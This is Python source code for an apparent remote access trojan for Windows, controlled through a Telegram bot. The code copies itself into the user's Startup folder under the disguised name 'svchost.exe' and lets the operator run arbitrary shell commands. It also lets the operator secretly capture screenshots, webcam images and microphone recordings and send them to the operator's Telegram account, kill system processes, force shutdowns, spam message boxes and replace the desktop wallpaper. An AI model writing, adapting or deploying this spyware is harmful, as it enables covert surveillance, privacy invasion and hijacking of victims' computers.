# -*- coding: utf-8 -*-
import telebot
import sys
from PIL import ImageGrab
import os
from requests import get
import requests as r
import cv2
import pyaudio
import wave
import ctypes
import subprocess
from uuid import getnode as get_mac
import getpass
import random
import psutil
import platform
mac = get_mac()

iduser = "" # Your TelegramID
api_key = "" #Your TelegramBotApi
desktop_url = '' # WallPaper url

USER_NAME = getpass.getuser()
file_path = sys.argv[0]
bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
os.replace(file_path, bat_path + "\svchost.exe")

bot = telebot.TeleBot(api_key)

keyboard0 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard0.row('Help', "->")
keyboard01 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard01.row('Screen', 'Camera', 'Microfone', "-->")
keyboard02 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard02.row('<-', 'MessageDDoS', 'BSOD', 'PrankDesktop', "--->")
keyboard03 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard03.row('<--', 'Restart', 'Logout', 'Shutdown', 'SysInfo')


@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(iduser, 'Access Granted: ' + str(mac), reply_markup=keyboard0)
    bot.send_message(iduser, f'Choice the user - User XXXXXXXXXXXXXX\n'
                                f'/cmd command - Excute Command')

@bot.message_handler(commands=['cmd'])
def cmd(message):
    macddr = message.text
    macddr = macddr[:4]
    if str(macaddr) == str(mac):
        cmd = message.text[5:]
        res = os.popen(cmd)
        if str(res) == '0' :
            bot.send_message(iduser, "OK")
            if res != "":
                bot.send_message(iduser, res)
        if str(res) == '1':
            bot.send_message(iduser, "ERROR")
            if res != "":
                bot.send_message(iduser, res)

@bot.message_handler(content_types=['text'])
def send_text(message):
    global usermessage 
    usermessage = message
    if message.text == '->':
        bot.send_message(message.chat.id, 'Ок', reply_markup=keyboard01)
    if message.text == '-->':
        bot.send_message(message.chat.id, 'Ок', reply_markup=keyboard02)
    if message.text == '--->':
        bot.send_message(message.chat.id, 'Ок', reply_markup=keyboard03)
    if message.text == '<-':
        bot.send_message(message.chat.id, 'Ок', reply_markup=keyboard01)
    if message.text == '<--':
        bot.send_message(message.chat.id, 'Ок', reply_markup=keyboard02)

    if message.text == "Help":
        bot.send_message(iduser, 'Choice the user - User XXXXXXXXXXXXXX')
    macddr = message.text
    macddr = macddr[:4]
    
    if macddr == "User":
        bot.send_message(iduser, 'OK')
        global macaddr
        macaddr = message.text
        macaddr = macaddr[5:]
    try:
        if str(macaddr) == str(mac):
            if message.text == 'Screen':
                screenshot = ImageGrab.grab()
                screenshot.save('screenshot.jpg')
                photo = open("screenshot.jpg", "rb")
                bot.send_photo(iduser, photo)
                photo.close()
                os.remove("screenshot.png")
            if message.text == "Camera":
                bot.send_message(iduser, 'Wait...')
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cv2.imwrite('cam.png', frame)  
                cap.release()
                photocam = open('cam.png', 'rb')
                bot.send_photo(iduser, photocam)
                photocam.close()
                os.remove("cam.png")
            if message.text == "Microfone":
                bot.send_message(iduser, 'Wait...')
                CHUNK = 1024
                FORMAT = pyaudio.paInt16
                CHANNELS = 2
                RATE = 44100
                RECORD_SECONDS = 5
                WAVE_OUTPUT_FILENAME = "output.wav"

                p = pyaudio.PyAudio()

                stream = p.open(format=FORMAT,
                                channels=CHANNELS,
                                rate=RATE,
                                input=True,
                                frames_per_buffer=CHUNK)

                frames = []

                for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                    data = stream.read(CHUNK)
                    frames.append(data)


                stream.stop_stream()
                stream.close()
                p.terminate()

                wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()
                doc = open('output.wav', 'rb')
                bot.send_document(iduser, doc)
                doc.close()
                os.remove("output.wav")
            if message.text == "BSOD":
                bot.send_message(iduser, 'OK')
                os.system("Taskkill /IM explorer.exe /F")
                os.system("TASKKILL /IM svchost.exe /F")
            if message.text == "Shutdown":
                bot.send_message(iduser, 'OK')
                os.system("shutdown /s /t 0")
            if message.text == "Restart":
                bot.send_message(iduser, 'OK')
                os.system("shutdown /r /t 0")
            if message.text == "Logout":
                bot.send_message(iduser, 'OK')
                os.system("shutdown /l /t 0")
            if message.text == "MessageDDoS":
                bot.send_message(iduser, 'Wait...')
                chars = list('+-/*!&$#?=@<>abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
                for i in range(100):
                    randomtext = ''.join([random.choice(chars) for x in range(5)])
                    os.system('msg * ' + randomtext)
                bot.send_message(iduser, 'Complete')

            if message.text == 'PrankDesktop':
                bot.send_message(iduser, "Replacing the desktop image.....")
                img = r.get(desktop_url)
                mg_file = open('desktop.jpg', 'wb')
                mg_file.write(img.content)
                mg_file.close()
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "desktop.jpg", 0)
                bot.send_photo(iduser, get(desktop_url).content)
                os.remove("desktop.jpg")
            if message.text == 'SysInfo':
                my_system = platform.uname()
                gigabyte = float(1024 * 1024 * 1024)

                mem = psutil.virtual_memory()
                mem_total = float(mem.total / gigabyte)
                mem_free = float(mem.free / gigabyte)
                mem_used = float(mem.used / gigabyte)

                hdd = psutil.disk_usage('/')
                HDD_total = hdd.total / gigabyte
                HDD_Used = hdd.used / gigabyte
                HDD_Free = hdd.free / gigabyte

                bot.send_message(iduser,f"<b>------- Hardware Info-----</b>\n\n"
                                                            f" System --> {my_system.system}\n"
                                                            f" Name --> {my_system.node}\n"
                                                            f" Release --> {my_system.release}\n"
                                                            f" Version --> {my_system.version}\n"
                                                            f" Machine --> {my_system.machine}\n"
                                                            f" Processor --> {my_system.processor}\n\n"
                                                            f"<b>------- Memory Info-----</b>\n\n"
                                                            f" Memory Total --> {round(mem_total)} GB\n"
                                                            f" Free Memory --> {round(mem_free)} GB\n"
                                                            f" Used Memory --> {round(mem_used)} GB\n\n"
                                                            f"-------<b> Hard Disk Info-----</b>\n\n"
                                                            f" Total HDD --> {round(HDD_total)} GB\n"
                                                            f" Used HDD --> {round(HDD_Used)} GB\n"
                                                            f" Free HDD --> {round(HDD_Free)} GB\n")

    except:
        pass

bot.polling(none_stop=True)
